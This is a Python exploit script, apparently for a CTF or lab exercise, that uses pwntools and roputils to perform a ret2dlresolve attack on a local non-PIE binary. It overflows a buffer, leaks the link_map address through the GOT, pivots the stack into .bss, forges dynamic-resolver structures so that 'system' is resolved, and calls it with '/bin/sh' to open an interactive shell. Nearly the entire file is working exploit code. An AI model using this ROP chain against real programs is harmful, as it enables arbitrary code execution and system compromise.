##prerequisite
# 1. write/read is called, since need to leak got+8 to print out link_map_addr.
# 2. NO need to have libc!
# 3. need to compile with -no-pie, since need to find gadget
# 4. first call need to send at least offset + 200, means the read bytes should be big enough. mov $0x{more than offset + 200},%edx

from roputils import *
from pwn import process
from pwn import context
from pwn import u64

p = process('ret2dlresolve/rdlr-roputils')
context.log_level = 'debug'
p.recv()

rop = ROP('ret2dlresolve/rdlr-roputils')
offset = 120

addr_stage = rop.section('.bss') + 0x400 #fake stack size
print 'addr_stage= ' + hex(addr_stage)
ptr_ret = rop.search(rop.section('.fini'))

buf = rop.fill(offset)
buf += rop.call_chain_ptr(
    ['write', 1, rop.got()+8, 8],
    ['read', 0, addr_stage, 400]
, pivot=addr_stage)

p.send(buf)
addr_link_map = u64(p.recv(8))
print 'addr_link_map= ' + hex(addr_link_map)
addr_dt_debug = addr_link_map + 0x1c8

buf = rop.call_chain_ptr(
    ['read', 0, addr_dt_debug, 8],
    [ptr_ret, addr_stage+380]
)
buf += rop.dl_resolve_call(addr_stage+250)
buf += rop.fill(250, buf)
buf += rop.dl_resolve_data(addr_stage+250, 'system')
buf += rop.fill(380, buf)
buf += rop.string('/bin/sh')
buf += rop.fill(400, buf)

p.write(buf)
p.write(p64(0))
p.interactive()